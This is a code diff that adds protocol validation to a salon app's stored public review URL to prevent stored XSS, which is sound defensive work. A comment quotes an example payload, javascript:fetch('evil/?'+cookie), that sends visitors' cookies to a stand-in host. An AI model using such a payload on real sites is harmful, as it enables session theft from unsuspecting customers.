@@ -3,6 +3,7 @@
 import { revalidatePath } from "next/cache";
 import { createClient } from "@/lib/supabase/server";
 import { getCurrentProfile } from "@/lib/auth-server";
+import { validateWebUrl } from "@/lib/url-validation";
 
 export async function getProfile() {
   const supabase = await createClient();
@@ -148,6 +149,14 @@ export async function updateSalon(input: {
     return { error: "TRN is required when VAT is charged" };
   }
 
+  // public_review_url is rendered as window.location.href on the public
+  // /r/[token] page. Without a protocol check, an owner (or attacker
+  // with owner creds) could store javascript:fetch('evil/?'+cookie) and
+  // execute JS in every reviewing customer's browser.
+  const reviewUrlResult = validateWebUrl(input.public_review_url, "Review URL");
+  if ("error" in reviewUrlResult) return { error: reviewUrlResult.error };
+  const reviewUrl = reviewUrlResult.value;
+
   const supabase = await createClient();
   const { error } = await supabase
     .from("salons")
@@ -155,7 +164,7 @@ export async function updateSalon(input: {
       name,
       brand_color: input.brand_color || null,
       contact_phone: input.contact_phone || null,
-      public_review_url: input.public_review_url || null,
+      public_review_url: reviewUrl,
       signoff: input.signoff || null,
       default_language: input.default_language || "en",
       currency,
